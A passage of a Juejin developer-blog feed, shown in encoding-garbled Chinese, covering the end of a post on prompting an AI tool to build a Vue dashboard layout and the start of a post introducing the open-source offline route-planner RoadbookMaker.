<p>å°†å·¦ä¾§ å®‰å®šé—¨è¡—é“ å’Œ å…¨å±€æ¦‚è§ˆ å¡ç‰‡å®½åº¦å‡å°ä¸€ç‚¹ï¼Œè®©å³ä¾§çš„ æ‰§æ³•æ£€æŸ¥æƒ…å†µ å’Œ å°å¾ªç¯æ¡ˆä»¶æ¦‚è§ˆ ç©ºé—´æ›´å¤§ä¸€ç‚¹</p>
</blockquote>
<h3 data-id="heading-10">è°ƒæ•´ä½ç½®</h3>
<p>åŸºäºå®é™…æ•ˆæœï¼Œæ˜æ˜¾å³ä¾§æ•°æ®æ”¾ä¸ä¸‹äº†ï¼Œè®©ä¸¤ä¸ªæ¨¡å—æ¢ä¸ªä½ç½®ï¼Œå…¨éƒ¨å¯¹é½ï¼Œè¿™é‡Œå…ˆä¸è€ƒè™‘UIå›¾ä¸­çš„å‚è€ƒä½ç½®</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5bf7a01e5894c3ba4ba80ca570d21cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=DBxCgHDMTwM5N5fUHAamQbq%2Fb2g%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æç¤ºè¯</p>
<p>å°† æ‰§æ³•æ£€æŸ¥æƒ…å†µ å’Œ æ‰§æ³•åŠæ¡ˆæƒ…å†µ ä¸¤ä¸ªå¡ç‰‡ä½ç½®äº’æ¢</p>
</blockquote>
<h3 data-id="heading-11">è§£å†³æŠ¥é”™</h3>
<p>åœ¨æµ‹è¯•é¡µé¢ç¼©æ”¾æ—¶ï¼Œå‘ç°æ§åˆ¶å°å¤§é‡æŠ¥é”™ï¼Œç›´æ¥æˆªå›¾è®©å®ƒä¿®å¤ä¸€ä¸‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a82bb155bff8426e806f7fb5c3dfb007~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=AAak%2Bs6yneWgsQVU2nWexfIrgZ4%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æç¤ºè¯</p>
<p>è¿™ä¸ªé¡µé¢è¿è¡Œåï¼Œæ§åˆ¶å°æœ‰æŠ¥é”™ï¼Œè¯·åˆ†æå¹¶è§£å†³</p>
</blockquote>
<h3 data-id="heading-12">ä¼˜åŒ–å¸ƒå±€</h3>
<p>è¿™é‡Œç”±äºå®ç°å·®è·æ¯”è¾ƒå¤§ï¼Œç›´æ¥ä»UIå›¾ä¸­æˆªå–éƒ¨åˆ†æ¨¡å—å›¾ï¼Œè®©AIæ›´ç²¾å‡†åŒ–ä¿®æ”¹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b972bfae1e44c0aa6da322edbf71e5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=7%2FWYaqqZTaU7sh5uRjAPlJ8reww%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æç¤ºè¯</p>
<p>æ ¹æ®è¿™ä¸ª æ‰§æ³•åŠæ¡ˆæƒ…å†µ å¡ç‰‡æ•ˆæœæˆªå›¾ï¼Œä¼˜åŒ–ç°åœ¨çš„å¸ƒå±€ï¼Œæ²¡æœ‰å›¾ç‰‡ï¼Œå…ˆç”¨ç©ºçš„divå ä½ï¼Œç±»ä¼¼ å®‰å®šé—¨è¡—é“ é‡Œé¢çš„æ•ˆæœ</p>
</blockquote>
<h3 data-id="heading-13">ä¿®æ”¹tabæ•ˆæœ</h3>
<blockquote>
<p>æç¤ºè¯</p>
<p>æ‰§æ³•æ£€æŸ¥æƒ…å†µ ä¸­çš„ æ£€æŸ¥é‡ã€æ£€æŸ¥å•ç±»å‹ã€ä¸åˆæ ¼æ£€æŸ¥äº‹é¡¹ æ”¹æˆ å…¨å±€æ¦‚è§ˆä¸­çš„ tab æ•ˆæœ</p>
</blockquote>
<h2 data-id="heading-14">æ•ˆæœé¢„è§ˆ</h2>
<p>è¿™äº›æ”¹å®Œåï¼Œèµ·ç è¿™ä¸ªé¡µé¢çœ‹èµ·æ¥æ•´æ•´é½é½çš„ï¼Œè¯¥æœ‰çš„éƒ½æœ‰äº†ï¼Œçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå¤§å±äº†</p>
<p><strong>æ³¨æ„ï¼Œå…¨ç¨‹æ²¡æœ‰åœ¨vueæ–‡ä»¶ä¸­æ”¹ä¸€è¡Œä»£ç </strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3fe7ba2cb6f435993f3796263b7cea1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=J07AUXg8706ZD1WIfzoAyNFgtI8%3D" alt="" loading="lazy"/></p>
<p>ç”±äºUIè¿˜æ²¡æä¾›å›¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®UIæä¾›çš„å›¾ï¼Œå†å•ç‹¬ä¸€ä¸ªä¸ªæ¨¡å—æ”¹äº†</p>
<h2 data-id="heading-15">æç¤ºè¯ä½¿ç”¨æŠ€å·§</h2>
<p>å…³äºæç¤ºè¯çš„ä½¿ç”¨ï¼Œæˆ‘çš„ç»éªŒæ˜¯åˆšå¼€å§‹å¯ä»¥å…ˆè¯´ä¸€ä¸ªå¤§æ¦‚è¦æ±‚ï¼Œç„¶åå†æ ¹æ®ç»†åŒ–æè¿°</p>
<p>å¦‚æœä¸çŸ¥é“æ€ä¹ˆæè¿°ï¼Œå¯ä»¥çœ‹AIçš„æ€è€ƒå’Œå›ç­”åˆ†æï¼Œå®ƒæ˜¯æ€ä¹ˆç”¨è¯çš„ï¼Œç„¶åæ¨¡ä»¿AIå¯¹é—®é¢˜çš„æè¿°æ–¹å¼</p>
<p>æ…¢æ…¢æ¥ï¼Œåœ¨æç¤ºæ–¹é¢å°±ä¼šè¶Šæ¥è¶Šå‡†ç¡®ï¼ŒAIæ‰§è¡Œçš„ä»»åŠ¡ä¹Ÿä¼šè¶Šæ¥è¶Šç²¾å‡†</p>
<h2 data-id="heading-16">Google Antigravity ä½¿ç”¨é—®é¢˜</h2>
<p>å¦‚æœé¦–æ¬¡ä½¿ç”¨ï¼Œå‡ºç°ä¸‹é¢è¿™ç§ç™»å½•ä¸ä¸Šçš„æƒ…å†µï¼Œå¯ä»¥å°è¯•åˆ‡æ¢å¹²å‡€çš„èŠ‚ç‚¹ï¼Œæˆ–è€…å¼€å¯Tunæ¨¡å¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebf19441afba4144befe2c52d285249c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=M5svgDaXv%2Bpcg0cH040HQzvZNDc%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœæ˜¯å·²ç»ç™»å½•æˆåŠŸï¼Œä¹‹å‰èƒ½ç”¨ï¼Œåæ¥åˆä¸èƒ½ç”¨äº†ï¼Œå¯èƒ½æ˜¯èŠ‚ç‚¹çš„IPè¢«å°äº†ï¼Œæ¢æ–°çš„åœ°åŒºèŠ‚ç‚¹</p>
<p>æˆ‘é‡åˆ°çš„æƒ…å†µæ˜¯åŸæ¥ç”¨çš„æ—¥æœ¬èŠ‚ç‚¹ï¼Œèƒ½ç”¨ï¼Œåæ¥ä¸èƒ½ç”¨äº†ï¼ˆåˆ‡åœ°åŒºä¹Ÿä¸è¡Œï¼‰ï¼Œé‡å¯ç”µè„‘åé‡æ–°è¿çš„ç¾åŒºèŠ‚ç‚¹æ‰å¥½ä½¿çš„</p>
<blockquote>
<p>æ¬¢è¿å¤§å®¶è®¨è®ºäº¤æµï¼Œå¦‚æœå–œæ¬¢æœ¬æ–‡ç« æˆ–æ„Ÿè§‰æ–‡ç« æœ‰ç”¨ï¼ŒåŠ¨åŠ¨ä½ é‚£å‘è´¢çš„å°æ‰‹ç‚¹èµã€æ”¶è—ã€å…³æ³¨å†èµ°å‘—Â <code>^_^</code>Â </p>
<p>å¾®ä¿¡å…¬ä¼—å·ï¼šè‰å¸½lufei</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e1fd6d3bc93444bbb257fc45e1826b11~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŒå€¦äº†åœ°å›¾APIçš„å„ç§é™åˆ¶ï¼Ÿæˆ‘åšäº†ä¸ªå¼€æºè·¯ä¹¦å·¥å…·ï¼Œç¦»çº¿ä¹Ÿèƒ½ç©ï¼]]></title>    <link>https://juejin.cn/post/7581688255624609844</link>    <guid>https://juejin.cn/post/7581688255624609844</guid>    <pubDate>2025-12-09T09:03:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581688255624609844" data-draft-id="7581545175509942324" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŒå€¦äº†åœ°å›¾APIçš„å„ç§é™åˆ¶ï¼Ÿæˆ‘åšäº†ä¸ªå¼€æºè·¯ä¹¦å·¥å…·ï¼Œç¦»çº¿ä¹Ÿèƒ½ç©ï¼"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-09T09:03:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="chenxuan520"/> <meta itemprop="url" content="https://juejin.cn/user/602972918907720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŒå€¦äº†åœ°å›¾APIçš„å„ç§é™åˆ¶ï¼Ÿæˆ‘åšäº†ä¸ªå¼€æºè·¯ä¹¦å·¥å…·ï¼Œç¦»çº¿ä¹Ÿèƒ½ç©ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/602972918907720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    chenxuan520
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:03:21.000Z" title="Tue Dec 09 2025 09:03:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å—¨ï¼Œå¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ <strong>chenxuan</strong>ã€‚ä½œä¸ºä¸€ä¸ªçƒ­çˆ±æ—…æ¸¸çš„å¼€å‘è€…ï¼Œæˆ‘ä¸€ç›´åœ¨å¯»æ‰¾ä¸€æ¬¾ç§°æ‰‹çš„è·¯ä¹¦è§„åˆ’å·¥å…·ï¼Œä½†å¸‚é¢ä¸Šçš„äº§å“æ€»æœ‰äº›ä¸å°½å¦‚äººæ„çš„åœ°æ–¹ï¼šè¦ä¹ˆéœ€è¦ç¹ççš„API Keyç”³è¯·ï¼Œè¦ä¹ˆåœ¨ç½‘ç»œä¸ä½³æ—¶æ— æ³•ä½¿ç”¨ï¼Œè¦ä¹ˆå°±æ˜¯æ‹…å¿ƒè‡ªå·±çš„è¡Œç¨‹æ•°æ®éšç§ã€‚</p>
<p>äºæ˜¯ï¼Œæˆ‘å†³å®šè‡ªå·±åŠ¨æ‰‹ï¼Œ<code>RoadbookMaker</code> ç”±æ­¤è¯ç”Ÿã€‚å®ƒæ˜¯ä¸€ä¸ª<strong>å®Œå…¨å…è´¹ã€æ— éœ€æ³¨å†Œã€æ— éœ€ä»»ä½•API Keyã€ç”šè‡³å¯ä»¥å®Œå…¨ç¦»çº¿ä½¿ç”¨çš„è·¯ä¹¦è§„åˆ’å·¥å…·</strong>ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œå®ƒå®Œå…¨å¼€æºã€‚</p>
<p><strong>é¡¹ç›®ä¸åœ¨çº¿ä½“éªŒåœ°å€ï¼š</strong></p>
<ul>
<li><strong>GitHubåœ°å€</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchenxuan520%2Froadbook" target="_blank" title="https://github.com/chenxuan520/roadbook" ref="nofollow noopener noreferrer">github.com/chenxuan520â€¦</a></li>
<li><strong>åœ¨çº¿ä½“éªŒ</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmap.chenxuanweb.top" target="_blank" title="https://map.chenxuanweb.top" ref="nofollow noopener noreferrer">map.chenxuanweb.top</a></li>
</ul>
<p align="center">
  <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea246ef1950d4a2b8e187f478099787d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hlbnh1YW41MjA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875801&amp;x-signature=6bA3J0ImduU3%2BmhfskGTeonbcFc%3D" alt="RoadbookMaker Logo" width="250" height="250" loading="lazy"/>
</p>
<hr/>
<h2 data-id="heading-0">æ ¸å¿ƒä¼˜åŠ¿ï¼šç®€å•ï¼Œä½†å¼ºå¤§</h2>
<p>åœ¨æ·±å…¥äº†è§£å¦‚ä½•ä½¿ç”¨å‰ï¼Œå…ˆå¿«é€Ÿæ¦‚è§ˆä¸€ä¸‹ <code>RoadbookMaker</code> æœ€æ ¸å¿ƒçš„å‡ ä¸ªä¼˜åŠ¿ï¼š</p>
<ul>
<li>
<p><strong>ğŸš€ çœŸæ­£çš„é›¶é—¨æ§›</strong></p>
<ul>
<li><strong>æ— éœ€API Key</strong>: æ— éœ€æ³¨å†Œä»»ä½•åœ°å›¾å‚å•†çš„å¼€å‘è€…è´¦å·ï¼Œå…å»ç”³è¯·å’Œé…ç½®Keyçš„çƒ¦æ¼ã€‚</li>
<li><strong>æ— éœ€æ³¨å†Œç™»å½•</strong>: æ²¡æœ‰è´¦æˆ·ä½“ç³»ï¼Œæ‰“å¼€å³ç”¨ã€‚</li>
<li><strong>å®Œå…¨ç¦»çº¿å¯ç”¨</strong>: æ ¸å¿ƒåŠŸèƒ½åœ¨æ–­ç½‘æ—¶ä¾æ—§å¯ç”¨ï¼Œæ‰€æœ‰æ•°æ®é»˜è®¤å®‰å…¨åœ°å­˜å‚¨åœ¨ä½ çš„æµè§ˆå™¨æœ¬åœ°ã€‚</li>
</ul>
</li>
<li>
<p><strong>ğŸ“± æè‡´çš„ç”¨æˆ·ä½“éªŒ</strong></p>
<ul>
<li><strong>æ‰‹æœºç«¯å®Œç¾é€‚é…</strong>: å“åº”å¼è®¾è®¡ï¼Œåœ¨æ‰‹æœºä¸Šä¹Ÿèƒ½è·å¾—æµç•…çš„è§„åˆ’ä½“éªŒã€‚</li>
<li><strong>ä¸€é”®é›†æˆ</strong>ï¼šæ— ç¼è·³è½¬è‡³<strong>å¯¼èˆª</strong>ï¼ˆç™¾åº¦ã€é«˜å¾·ã€Googleï¼‰ã€<strong>æºç¨‹è®¢ç¥¨</strong>ã€<strong>Googleé…’åº—</strong>å’Œ<strong>å°çº¢ä¹¦</strong>æ”»ç•¥ï¼Œå®ç°ä»è§„åˆ’åˆ°å‡ºè¡Œçš„ä¸€ç«™å¼æœåŠ¡ã€‚</li>
<li><strong>å¿«æ·é”®æ”¯æŒ</strong>: æä¾› <code>A</code> æ·»åŠ ã€<code>C</code> è¿æ¥ã€<code>D</code> åˆ é™¤ç­‰å…¨é”®ç›˜å¿«æ·é”®ï¼Œå¤§å¹…æå‡è§„åˆ’æ•ˆç‡ã€‚</li>
</ul>
</li>
<li>
<p><strong>ğŸ  ä¾¿æ·çš„è‡ªæ‰˜ç®¡</strong></p>
<ul>
<li><strong>Dockerä¸€é”®éƒ¨ç½²</strong>: æä¾› Docker é•œåƒï¼Œä¸€æ¡å‘½ä»¤å°±èƒ½åœ¨è‡ªå·±çš„æœåŠ¡å™¨æˆ–NASä¸Šæ‹¥æœ‰å®ƒã€‚</li>
<li><strong>æ•°æ®ç§æœ‰</strong>ï¼šè‡ªæ‰˜ç®¡æ„å‘³ç€æ•°æ®å®Œå…¨ç”±ä½ æŒæ§ï¼Œéšç§å®‰å…¨æ„Ÿæ‹‰æ»¡ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">æ‰‹æŠŠæ‰‹æ•™ä½ ç”¨ RoadbookMaker è§„åˆ’ä¸€æ¬¡æ—…è¡Œ</h2>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®ä¾‹ï¼Œçœ‹çœ‹ç”¨å®ƒè§„åˆ’ä¸€æ¬¡â€œå‘¨æœ«åŸå¸‚æ¼«æ­¥â€æœ‰å¤šç®€å•ã€‚</p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šæ·»åŠ ä½ çš„è¶³è¿¹</h3>
<p>æ‰“å¼€ç½‘ç«™ï¼Œç•Œé¢å°±æ˜¯ä¸€å¼ ç®€æ´çš„åœ°å›¾ã€‚ä½ å¯ä»¥é€šè¿‡é¡¶éƒ¨çš„æœç´¢æ¡†å¯»æ‰¾åœ°ç‚¹ï¼Œæˆ–è€…ç›´æ¥åœ¨åœ°å›¾ä¸Šè¿›è¡Œæ“ä½œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79f43ec79f174d55a45f56eca594d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hlbnh1YW41MjA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875801&amp;x-signature=WNkQEIl8ugwclr5tvQOz%2Bt9L4ZU%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>æ·»åŠ æ ‡è®°ç‚¹</strong>ï¼šç‚¹å‡»é¡¶éƒ¨çš„ â€œæ·»åŠ æ ‡è®°ç‚¹â€ æŒ‰é’®ï¼Œæˆ–ç›´æ¥æŒ‰å¿«æ·é”® <code>A</code>ï¼Œé¼ æ ‡ä¼šå˜æˆä¸€ä¸ªåå­—å‡†æ˜Ÿã€‚åœ¨åœ°å›¾ä¸Šä½ æ„Ÿå…´è¶£çš„ä½ç½®ç‚¹å‡»ä¸€ä¸‹ï¼Œä¸€ä¸ªæ ‡è®°ç‚¹å°±æ·»åŠ å¥½äº†ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/360b6f41ecf747d39908a8caf534c765~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hlbnh1YW41MjA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875801&amp;x-signature=Buxr3n1GfIIU0C7gIkQg8BpSSAs%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šè¿æ¥æˆçº¿ï¼Œè§„åˆ’è·¯çº¿</h3>
<p>å½“ä½ åœ¨åœ°å›¾ä¸Šæ ‡è®°äº†å‡ ä¸ªç‚¹åï¼ˆæ¯”å¦‚å’–å•¡é¦†ã€ä¹¦åº—ã€å…¬å›­ï¼‰ï¼Œå°±å¯ä»¥å°†å®ƒä»¬è¿æ¥èµ·æ¥å½¢æˆè·¯çº¿ã€‚</p>
<ul>
<li><strong>è¿æ¥æ ‡è®°ç‚¹</strong>ï¼šç‚¹å‡»â€œè¿æ¥æ ‡è®°ç‚¹â€æŒ‰é’®æˆ–æŒ‰ <code>c</code>ï¼Œåœ¨å¼¹å‡ºçš„çª—å£ä¸­é€‰æ‹©èµ·å§‹ç‚¹å’Œç›®æ ‡ç‚¹ï¼Œå¹¶é€‰æ‹©ä¸€ç§äº¤é€šæ–¹å¼ï¼Œä¾‹å¦‚â€œæ­¥è¡Œâ€ğŸš¶ã€‚ä¸€æ¡ä»£è¡¨è·¯çº¿çš„è¿æ¥çº¿å°±ç”Ÿæˆäº†ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cd176611099498e885a40e55c162892~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hlbnh1YW41MjA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875801&amp;x-signature=%2BjDbqUytd%2B2opCytUBmoLF1Eiyk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0f23b51b7864a87b89c5162e1fccf74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hlbnh1YW41MjA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875801&amp;x-signature=vBAz0Nnzl7J2xL3H76ZktGqXYQc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ï¼šä¸°å¯Œä½ çš„è¡Œç¨‹ç»†èŠ‚</h3>
<p>ç°åœ¨ï¼Œè·¯ä¹¦å·²ç»æœ‰äº†åŸºæœ¬çš„æ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºå®ƒå¡«å……æ›´å¤šç»†èŠ‚ã€‚</p>
<ul>
<li>
<p><strong>ç¼–è¾‘æ ‡è®°ç‚¹</strong>ï¼šå•å‡»ä»»æ„ä¸€ä¸ªæ ‡è®°ç‚¹ï¼Œå³ä¾§ä¼šæ»‘å‡ºè¯¦æƒ…é¢æ¿ã€‚åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥ï¼š</p>
<ul>
<li>ä¿®æ”¹åç§°ï¼Œè®¾ç½®åˆ°è¾¾å’Œç¦»å¼€çš„<strong>æ—¶é—´</strong>ã€‚</li>
<li>ä¸ºå®ƒæ›´æ¢ä¸€ä¸ªé†’ç›®çš„<strong>å›¾æ ‡</strong>ï¼ˆæ”¯æŒæ•°å­—ã€Emojiæˆ–è‡ªå®šä¹‰æ–‡å­—ï¼‰ã€‚</li>
<li>é€šè¿‡ â€œ<strong>å»å°çº¢ä¹¦æœä¸€æœ</strong>â€ é“¾æ¥ï¼Œç›´æ¥æ¢ç´¢è¿™ä¸ªåœ°ç‚¹çš„å‘¨è¾¹ç©æ³•ã€‚</li>
<li>é€šè¿‡ â€œ<strong>Googleé…’åº—æœç´¢</strong>â€ å¿«é€ŸæŸ¥æ‰¾é™„è¿‘çš„ä½å®¿ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç¼–è¾‘è¿æ¥çº¿</strong>ï¼šåŒæ ·ï¼Œå•å‡»è¿æ¥çº¿ï¼Œä¹Ÿå¯ä»¥åœ¨è¯¦æƒ…é¢æ¿ä¸­ï¼š</p>
<ul>
<li>è®¾ç½®è¿™æ®µè·¯ç¨‹çš„<strong>è€—æ—¶</strong>ã€‚</li>
